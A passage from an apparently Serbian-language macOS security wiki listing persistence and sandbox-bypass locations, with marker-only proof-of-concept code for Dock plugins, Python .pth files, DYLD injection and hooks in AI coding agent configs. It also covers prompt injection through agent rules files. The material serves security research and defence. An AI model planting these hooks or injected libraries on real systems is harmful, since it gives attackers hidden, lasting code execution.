Da biste napravili sopstveni importer, možete početi od ovog projekta: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), zatim promeniti naziv i **`CFBundleDocumentTypes`**, dodati **`UTImportedTypeDeclarations`** kako bi podržavao željenu ekstenziju i odraziti ih u **`schema.xml`**.\
Zatim **promenite** kod funkcije **`GetMetadataForFile`** tako da izvrši payload kada se kreira datoteka sa ekstenzijom koju obrađuje.

Na kraju, **izgradite i kopirajte novi `.mdimporter`** na jednu od tri prethodne lokacije. Da biste proverili da li je učitan, možete **pratiti logove** ili pokrenuti **`mdimport -L`**.

> [!TIP]
> Iako je sandbox za importere veoma restriktivan, `mdworker` indeksira datoteke sa **privilegovanim pristupom za čitanje**. Zbog toga zlonamerni `.mdimporter` može da čita *sadržaj* datoteka na lokacijama zaštićenim TCC-om (Downloads, Pictures, Desktop, …) i da eksfiltrira prikupljene metapodatke bez ikakvog TCC upita — **„Sploitlight“ TCC bypass (CVE-2025-31199)**, zakrpljen u macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Za posebnu tehniku za macOS 26, koja prenosi zaštićene bajtove u **nazivima Darwin notification**, a ne u sistemskim logovima, pogledajte [curenje preko naziva Darwin notification u Spotlight importer-u](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Okno za podešavanja~~

> [!CAUTION]
> Izgleda da ovo više ne radi.

Opis: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Korisno za sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Potrebna je određena radnja korisnika
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Izgleda da ovo više ne radi.<sup>[[26]](#references)</sup>

### Datoteke skripti aplikacija

Opis: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Međutim, ciljana aplikacija mora biti instalirana i žrtva mora da je pokrene/koristi
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

**Interpretirana skripta koju instalirana aplikacija ili alat zaista izvršava** i koju napadač može da izmeni. Proverite dozvole datoteke i putanju poziva; samo pronalaženje `.sh` ili `.py` datoteke nije dovoljno. Apple-ov [vodič za potpisivanje koda](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) navodi da potpisani paketi aplikacija zapečaćuju resurse, uključujući skripte. Izmena skripte unutar paketa narušava to zapečaćenje i može biti otkrivena ili blokirana prilikom provere paketa. Spoljna skripta, kao što je Homebrew launcher, ima drugačije ponašanje u pogledu potpisivanja i poverenja. Istorijski primeri iz opisa uključuju:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – skripta koju su koristile starije verzije Sublime Text-a; potrebno je proveriti da li datoteka postoji i da li se koristi pri pokretanju u instaliranoj verziji. Nije bila prisutna na testnom Mac-u.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) ili **`/usr/local/bin/brew`** (Intel) – Bash launcher koji se izvršava kada se pozove ta `brew` putanja, ako je instaliran i napadač može da ga menja. `/opt/homebrew/bin/brew` je bila Bash skripta sa dozvolom za pisanje na testnom Mac-u; to je lokalno zapažanje, a ne opšte pravilo o dozvolama za Homebrew.
- **`idlemain.py`** u Python app bundle-u IDLE-a – za pisanje može biti potrebna administratorska dozvola, ali se skripta izvršava sa identitetom IDLE korisnika.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – istorijska shell skripta koja se izvršavala kao root kada je bila instalirana odgovarajuća `org.wireshark.ChmodBPF` launchd zadatak. Skripta i zadatak nisu bili prisutni na testnom Mac-u.

#### Opis i eksploatacija

Neki alati i aplikacije izvršavaju interpretirane skripte tokom rada. Skripta u koju može da se piše može da izvrši dodate komande kada je konkretni pozivalac sledeći put pokrene, pod uslovom da provere potpisa, karantin i druge provere to dozvole. Prvobitno istraživanje prikazalo je nekoliko instalacija iz 2019. godine; ponovo proverite njihove putanje i okidače u ciljnoj verziji.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Ovaj test kopiranja dao je rezultat `marker fired: True` na macOS 26.5.2; originalni pokretač nije izmenjen. Dokazuje da se tačka umetanja izvršava u kopiji, a ne da bi izmenjeni potpisani bundle aplikacije ili stvarna Homebrew instalacija prošli sve provere pri pokretanju.

### Dock Tile Plugins

Analiza: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Potrebno je da aplikacija koja deklariše dodatak bude otkrivena/registrovana i da je Dock obradi
  - Dodatak se učitava u pomoćni proces koji je **potpisao Apple**, nema entitlement za app-sandbox i ima **onemogućenu proveru biblioteka**. U istraživanju koje se citira ovaj pomoćni proces nije bio prikazan u korisničkom interfejsu Background Task Management; vidljivost u ciljnom izdanju treba proveriti.
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, naveden pomoću ključa **`NSDockTilePlugIn`** u `Info.plist` aplikacije; sopstveni `Info.plist` dodatka postavlja **`NSPrincipalClass`**.

#### Opis i eksploatacija

Kada aplikacija deklariše `NSDockTilePlugIn`, Dock može da učita navedeni bundle u XPC pomoćni proces **`com.apple.dock.external.extra`** (`...extra.arm64` na Apple Silicon-u) pri prijavljivanju ili kada se njena pločica doda; nije neophodno da se sama aplikacija pokrene. Aplikacija mora biti otkrivena/registrovana i prihvaćena od strane macOS-a. Pomoćni proces je **potpisao Apple**, nema entitlement `com.apple.security.app-sandbox` i ima `com.apple.security.cs.disable-library-validation`. Pri učitavanju se poziva metoda **`setDockTile:`** glavne klase; odatle može da se pretplati na distribuirana obaveštenja (npr. `com.apple.screenIsLocked`) za kasnije događaje.<sup>[[38]](#references)</sup>

Na macOS 26.5.2, pregled samo za čitanje pomoću `codesign` potvrdio je Apple-ov potpis i entitlements pomoćnog procesa, a nekoliko instaliranih aplikacija deklarisalo je `NSDockTilePlugIn`. Na tom Mac-u nije instaliran niti učitan nijedan novi dodatak, pa izvršavanje novonapisanog bundle-a u tom izdanju nije testirano.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgeti (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension radi u **sopstvenom procesu**, a dodavanje widgeta ne prikazuje upozorenje Background Task Management
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist se nalazi unutar kontejnera zaštićenog pomoću TCC-a, pa je za njegovo uređivanje spolja potreban Full Disk Access ili TCC bypass

#### Lokacija

- Bundle widget extensiona: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktivni/registrovani widgeti: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (ključevi `widgets.instances` i `widgets.widgets`)

#### Opis i eksploatacija

WidgetKit extension isporučen unutar aplikacije radi u **sopstvenom procesu** kojim upravlja Notification Center. Registracijom instance u `widgets.instances` (blob `CHSWidget` kodiran u base64 formatu pomoću `NSKeyedArchiver`, sa ugrađenim podacima `INIntent`) i ponovnim pokretanjem NotificationCenter-a učitava se widget i izvršava njegov `TimelineProvider`/intent kod.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (pokreće AppleScript)

Opis: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Međutim, Mail.app mora biti podešen sa nalogom i pokrenut; okidač je dolazna e-pošta
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - Izmena pravila/skripti izvan aplikacije Mail može zahtevati da Mail bude zatvoren i da na novijim verzijama macOS-a bude omogućen Full Disk Access

#### Lokacija

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (lokalna pravila; `V10` na Sonoma/Sequoia, `V11`+ na novijim verzijama)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (pravila sinhronizovana preko iCloud-a imaju prednost)
- Aktivacija pravila: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Opis i eksploatacija

Apple Mail **pravilo** može da ima akciju *„Run AppleScript“*. Dodavanjem pravila koje se podudara sa posebno sastavljenim **naslovom poruke** i pokreće napadačevu skriptu, protivnik dobija **daljinski aktivirano, prikriveno** izvršavanje koda u kontekstu aplikacije Mail svaki put kada stigne e-poruka sa odgovarajućim sadržajem — vektor koji zaobilazi mnoge skenere za otkrivanje mehanizama opstanka jer se ne kreira LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Podešavanje pravila da i **obriše** okidačku e-poruku prikriva tragove. Branioci mogu direktno da ga traže:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle)
  - Moderni macOS zahteva **ručno odobrenje korisnika** u System Settings → *Upravljanje uređajima* (tiha instalacija pomoću `profiles install` više nije moguća izvan MDM-a)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Instalirani profili se nalaze u **`/Library/Managed Preferences/`** i **`/var/db/ConfigurationProfiles/`**; profil je XML plist sa nizom `PayloadContent`.

#### Opis i eksploatacija

`.mobileconfig` nije primitiv za direktno izvršavanje koda, ali može da sačuva konfiguraciju, kao što su **pouzdani root CA** (`com.apple.security.root`), **globalni ili PAC proxy** (`com.apple.proxy.*`), **upravljane preference** (`com.apple.ManagedClient.preferences`) ili ograničenja. Na macOS-u 10.15 i novijim verzijama, Apple-ova definicija [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) navodi da postavljanje ove vrednosti na `true` u profilu koji je **ručno instaliran**, bez payload-a za lozinku za uklanjanje, zahteva **autentifikaciju administratora** za njegovo uklanjanje; to ne čini profil apsolutno nemogućim za uklanjanje. Profili instalirani putem MDM-a imaju zasebna pravila upravljanja i uklanjanja.<sup>[[44]](#references)</sup>

> [!WARNING]
> Običan konfiguracioni profil **nema tip payload-a koji dodaje proizvoljan `LaunchDaemon`/`LaunchAgent`**. Instaliranje daemona na taj način zahteva potpuno **MDM enrollment** i management agent/script — nemojte tretirati `.mobileconfig` kao mehanizam za isporuku launchd-a.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence pomoću DYLD_INSERT_LIBRARIES

- Korisno za zaobilaženje sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **uklanja** `DYLD_*` za SIP/platformske binarne fajlove, aplikacije sa hardened runtime-om i setuid ciljeve, pa ubacuje samo u nezaštićene procese i **ne** zaobilazi SIP/hardened runtime
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Pouzdan oblik: rečnik **`EnvironmentVariables`** unutar zlonamernog plist-a `LaunchAgent`/`LaunchDaemon` (pokreće se pri prijavljivanju/pokretanju sistema)
- Zastarelo/istorijski (navesti samo u izveštaju): **`~/.MacOSX/environment.plist`** (uklonjen u verziji 10.8) i **`/etc/launchd.conf`** (uklonjen u verziji 10.10)

#### Opis i eksploatacija

Ako napadač uspe da postavi `DYLD_INSERT_LIBRARIES` u okruženje procesa žrtve, dyld učitava napadačev dylib (pokreće se njegov konstruktor) u taj proces. Trajna varijanta smešta promenljivu u LaunchAgent, tako da se pri svakom pokretanju posla ponovo vrši ubacivanje. Imajte u vidu da se `launchctl setenv DYLD_*` filtrira u modernom macOS-u, pa promenljivu umesto toga smestite u plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Za potpune informacije o mehanici dylib injection/hijacking pogledajte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI alati za AI Coding Agent (hooks, MCP servers, rules files)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor u rules file (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Programer mora da koristi odgovarajući agent. Komande pri pokretanju izvršavaju se s privilegijama tog korisnika kada agent prihvati njihovu konfiguraciju; pravila poverenja u workspace i odobravanja MCP-a razlikuju se u zavisnosti od proizvoda i režima sesije.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (izvršava se kao korisnik; nasleđuje sve što terminal/agent već ima)

#### Lokacija

Eksplicitne konfiguracione datoteke za hooks i MCP mogu da pokrenu **shell komande ili child processes kada programer koristi alat** — bilo iz globalne datoteke za korisnika (persistence), bilo iz datoteke commit-ovane u repo (supply chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` i editor rules су **instructions за agent-а**, а не загарантовано извршавање shell команди при читању; њихов ефекат зависи од понашања agent-а и дозвола алата. Проверите актуелна правила за поверење и одобравање код сваког производа.

- **Claude Code**
  - `~/.claude/settings.json`, project `.claude/settings.json`, `.claude/settings.local.json` и ` /Library/Application Support/ClaudeCode/managed-settings.json` (само за root) **(MDM/managed settings **cannot be overridden** by the user → strong persistence)
  - `hooks` object — events `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — сваки покреће shell `command`
  - `statusLine.command` — shell команда која се извршава ради приказа статусне линије (у свакој сесији)
  - MCP servers у `~/.claude.json` / project `.mcp.json` — `command`+`args` покренути као child processes
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instructions које могу покушати prompt injection, у зависности од понашања agent-а и дозвола алата
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` покренути као child processes); project instructions у `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … извршавају команде); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Opis i eksploatacija

Ако актер може да измени глобална подешавања налога за корисника, његове hook или MCP команде могу да се извршавају у будућим сесијама под тим налогом. Конфигурација под контролом repo-а је посебан случај: [актуелна безбедносна документација за Claude Code](https://code.claude.com/docs/en/security) описује интерактивни дијалог за поверење у workspace и засебан захтев за одобрење project `.mcp.json` servers. [Његова матрица дозвола](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) наводи да hooks могу да се изврше након што је надређени фолдер означен као поуздан, а `claude -p`/SDK сесије не приказују интерактивни захтев за поверење; project MCP servers се повезују без захтева за одобрење у тим неинтерактивним режимима. Заобилажење project hook-а пре стицања поверења, пријављено као CVE-2025-59536, [исправљено је 2025.](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); немојте га сматрати подразумеваним тренутним понашањем. Вектори испоруке могу да обухватају компромитовани repo или злонамерни installer. Prompt injection путем rules file-а мање је предвидљив од експлицитног hook-а и и даље зависи од одобрења алата.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Пример глобалних корисничких подешавања за Claude Code; користите их за тестирање само у привременом налогу:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Primer globalne Codex MCP konfiguracije za korisnika:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Primer konfiguracije Cursor hook-a; proverite šemu instalirane verzije pre upotrebe:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

Opis: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [zloupotreba ExtensionInstallForcelist na macOS-u](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva podržani browser i instaliranu, omogućenu ekstenziju. External Extensions na macOS-u zahtevaju potvrdu korisnika; managed force-install zahteva odgovarajuću enterprise policy.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Ovo se razlikuje od **native messaging hosts** (pogledajte odeljak *Chrome native messaging hosts* iznad). Ovde je mehanizam za postojanost sama **automatski instalirana ekstenzija**.

#### Lokacija

- **External Extensions JSON** (otkriva se pri pokretanju browsera, a zatim je potrebno potvrditi omogućavanje na macOS-u):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (za jednog korisnika) ili `/Library/Application Support/Google/Chrome/External Extensions/` (za sve korisnike)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Force-install преко enterprise policy-ja** putem managed preferences / configuration profile-a:
  - ključ `ExtensionInstallForcelist` u `com.google.Chrome` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), čita se iz `/Library/Managed Preferences/` ili instaliranog `.mobileconfig` fajla

#### Opis i eksploatacija

Postoje dva različita načina instalacije. Chrome-ova [dokumentacija za eksternu instalaciju](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) navodi da **korisnici Windows-a i macOS-a moraju da potvrde i omoguće** ekstenziju ponuđenu putem *External Extensions* fajla; ona se ne izvršava samo zato što je taj JSON fajl upisan. Za instalaciju za sve korisnike na macOS-u, Chrome takođe zahteva da fajl spoljne ekstenzije bude zaštićen od izmena od strane neprivilegovanih korisnika. Managed `ExtensionInstallForcelist` ili `ExtensionSettings` policy može da instalira i zakači ekstenziju bez interakcije korisnika; [Google-ov vodič za Mac policy](https://support.google.com/chrome/a/answer/7517624) opisuje managed konfiguraciju i navodi da korisnik ne može da ukloni force-installed ekstenzije. To je putanja za deployment putem policy-ja, a ne prečica `defaults write` za jednog korisnika.<sup>[[49]](#references)</sup>

> [!WARNING]
> Na macOS-u, *External Extensions* JSON manifest mora da upućuje na URL za ažuriranje u **Chrome Web Store-u**, a ne na lokalni CRX fajl. Deployment putem managed policy-ja ima sopstvene enterprise preduslove i može da dozvoli managed self-hosted URL za ažuriranje. Za lokalnu unpacked ekstenziju u testnom profilu, Chrome-ov developer-mode prekidač `--load-extension=/path` je zaseban mehanizam i ne čini External Extensions JSON fajl samostalno izvršivim. Nemojte smatrati da je upisivanje u `Secure Preferences` isto što i bilo koja od ove dve dokumentovane putanje za registraciju.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Pokrenite Chrome u tom jednokratnom nalogu i posmatrajte upit za omogućavanje; ponašanje samog dodatka predstavlja PoC izvršavanja kada ga korisnik prihvati. Nakon testa uklonite manifest i onemogućite/deinstalirajte dodatak u tom profilu. Ovaj put nije isproban u aktivnom Chrome profilu na istraživačkom Mac računaru. Ni put preko upravljanih smernica tamo nije primenjen.

Force-install i External Extensions upućuju na ID-jeve dodataka iz **Chrome Web Store**-a; za trik nižeg nivoa za neprimetno ubacivanje lokalnog dodatka uređivanjem profila `Secure Preferences` potpisanog HMAC-om, kao i za druge oblike zloupotrebe Chromium procesa, pogledajte:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Rukovaoci URL šemama i tipovima datoteka (LaunchServices)

Writeup: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Okidač je da žrtva klikne na link (npr. u Chrome/Brave/Safari) ili otvori datoteku registrovanog tipa
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `Info.plist` paketa aplikacije koji deklariše **`CFBundleURLTypes`/`CFBundleURLSchemes`** (prilagođenu URL šemu) ili **`CFBundleDocumentTypes`** (ekstenziju datoteke/UTI)
- Efektivne podrazumevane vrednosti za korisnika mogu se nalaziti u **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (niz `LSHandlers`). Apple-ov podržani API za izbor podrazumevanog rukovaoca URL šeme je `LSSetDefaultHandlerForURLScheme`; direktno upisivanje u taj plist nije dokumentovan način registracije niti ažuriranja keša.

#### Opis i eksploatacija

Launch Services preuzima deklaracije za URL šeme i dokumente iz `Info.plist` registrovane aplikacije. [Apple-ov vodič za registraciju](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) navodi da do registracije može doći kada Finder otkrije aplikaciju, pri pokretanju ili prijavljivanju, ili putem eksplicitnog API-ja za registraciju; samo smeštanje aplikacije na neku lokaciju ne garantuje da će se registracija odmah pokrenuti. Nakon registracije, otvaranje odgovarajuće URL adrese ili dokumenta može pokrenuti izabranu aplikaciju-rukovaoca, u zavisnosti od korisnikovog izbora podrazumevanog rukovaoca i uobičajenih macOS provera pri pokretanju. Podržani API `LSSetDefaultHandlerForURLScheme` menja URL rukovaoca koji korisnik preferira; ne uzrokuje automatsko izvršavanje tek dodatе aplikacije.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Nijedna aplikacija nije registrovana niti je promenjena preferencija za rukovaoce na istraživačkom Mac računaru sa macOS 26.5.2. Da biste testirali stvarnog rukovaoca, koristite privremeni korisnički nalog, registrujte aplikaciju koja samo označava poziv i ima jedinstvenu šemu, pozovite njen URL, a zatim uklonite aplikaciju i njenu registraciju.

Za detaljno pregledanje/zloupotrebu rukovalaca ekstenzijama datoteka i URL šemama pogledajte:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python startup datoteke (`.pth` / `usercustomize` / `sitecustomize`)

Dokumentacija: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Pokreće se pri pokretanju odgovarajućeg Python interpreter-a kada je taj site direktorijum omogućen; okidač nije isti za sva virtuelna okruženja, Python verzije i opcije pokretanja
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - Pokreće se sa privilegijama/TCC pravima procesa koji je pokrenuo interpreter

#### Lokacija

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework verzije: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root nije potreban (upisivo za korisnika)
  - **Okidač**: pokretanje te Python verzije kada je njen user site omogućen; modul `site` obrađuje `.pth` datoteke u aktivnim site direktorijumima
- **`<user-site>/usercustomize.py`**
  - Root nije potreban
  - **Okidač**: pokretanje kada je user site omogućen (automatski ga uvozi `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (npr. `/opt/homebrew/lib/python3.13/site-packages/` ili sistemske putanje)
  - Root/admin prava mogu biti potrebna, u zavisnosti od lokacije interpreter-a
  - **Okidač**: pokretanje interpreter-a koji uključuje taj site direktorijum

#### Opis i eksploatacija

Pri pokretanju Python obično uvozi `site` i pretražuje aktivne `site-packages` direktorijume u potrazi za `.pth` datotekama. Pored dodavanja putanja, linija u `.pth` datoteci koja počinje sa `import ` izvršava Python kod čak i ako navedeni modul nigde drugde nije korišćen. Python takođe pokušava da uveze `sitecustomize` i, **kada je user site omogućen**, `usercustomize`.<sup>[[56]](#references)</sup> Okidač je kasnije pokretanje interpreter-a koji vidi izmenjeni direktorijum. `-S` onemogućava obradu `site`; `-s`, `-I` ili `PYTHONNOUSERSITE` onemogućavaju varijante za **user site**. `-I` uglavnom ne onemogućava globalni `sitecustomize`. Virtuelna okruženja takođe mogu isključiti user site. Proverite `python3 -m site` za konkretan interpreter.

Sledeći PoC je pokrenut na macOS 26.5.2. `PYTHONUSERBASE` premešta user site u privremeni direktorijum radi ovog testa; stvarni user site se ne menja:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Oba markera su se pojavila. Ponavljanje sa `-s`, `-I` ili `-S` sprečilo je pojavljivanje oba **user-site** markera u ovom testu. `sitecustomize` u globalnom site direktorijumu nije testiran.

## Root Sandbox Bypass

> [!TIP]
> Ovde možete pronaći lokacije za automatsko pokretanje korisne za **sandbox bypass**, koje omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku**, uz **root** pristup i/ili pod nekim drugim **neobičnim uslovima**.

### Periodic

> [!CAUTION]
